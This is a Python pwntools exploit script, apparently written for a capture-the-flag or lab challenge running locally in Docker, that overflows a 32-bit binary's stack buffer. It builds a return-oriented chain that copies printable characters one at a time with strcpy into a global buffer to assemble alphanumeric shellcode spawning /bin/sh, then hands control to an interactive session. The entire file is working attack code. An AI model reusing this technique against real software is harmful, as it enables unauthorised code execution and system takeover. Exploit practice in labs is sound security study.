#!/usr/bin/env python3
from pwn import *
from os import environ

context.update(arch='i386', os='linux')

ROOT = os.path.abspath(os.path.dirname(__file__))

if "REMOTE" in os.environ:
    if not "PORT" in os.environ:
        print("Need to specify the port number")
        exit(1)
    p = remote("localhost", int(os.environ["PORT"]))

else:
    target_path = os.path.abspath(os.path.join(ROOT, "../docker/target"))
    p = process(target_path, cwd=os.path.dirname(target_path))

# for vuln
vuln_name = os.path.abspath(os.path.join(ROOT, "../docker/vuln"))

target_elf = ELF(vuln_name) 
target_rop = ROP(target_elf)

target_string = b"TX-#399-%vrr-)VTTP\h0AGGXf50AHf5A0f5sOPTPXX-s399-uvrr-xVTTP\j0X40PZPh//shh/binT[PSTYj8X43GGGGGGGGGG"

#args = [target_name]
#args = [vuln_name]

gdbscripts = """
source ~/.gdbinit-pwndbg
break main
set output-radix 16
#continue
""".format() 

#p = gdb.debug(args, gdbscripts)
#p = process(args)

# w.r.t $ebp of start()
buf_offset = -0xd0

in_addr = target_elf.symbols["in"]
puts_addr = target_elf.symbols["puts"]
exit_addr = target_elf.symbols["exit"]
strcpy_addr = target_elf.symbols["strcpy"]

# get the address of each character from vuln
printable_first = b' '[0]
printable_last = b'~'[0]
printable_addr_table = [None]*printable_first
for i in range(printable_first, printable_last+1):
    printable_addr = next(target_elf.search(bytes([i])))
    printable_addr_table.append(printable_addr)
assert len(printable_addr_table) == printable_last + 1

null_addr = next(target_elf.search(b"\x00"))

# gadget in vuln
p4r = target_rop.find_gadget(["pop ebx", "pop esi", "pop edi", "pop ebp", "ret"]).address
p3r = p4r+1
p2r = p3r+1
p1r = p2r+1
ret = p1r+1

print(hex(p2r))
payload = b"B" * (-buf_offset)
payload += b"CCCC"
# strcpy(in, target_string)
for i in range(len(target_string)):
    # strcpy(in+i, alphabet_char)
    payload += p32(strcpy_addr)
    payload += p32(p2r)
    payload += p32(in_addr+i)
    char_addr = printable_addr_table[target_string[i]]
    payload += p32(char_addr)

# last null character
payload += p32(strcpy_addr)
payload += p32(p2r)
payload += p32(in_addr+len(target_string))
payload += p32(null_addr)

payload += p32(puts_addr)
payload += p32(exit_addr)
payload += p32(in_addr)
payload += p32(0)

#print(hexdump(payload))
p.sendline(payload)

p.interactive()
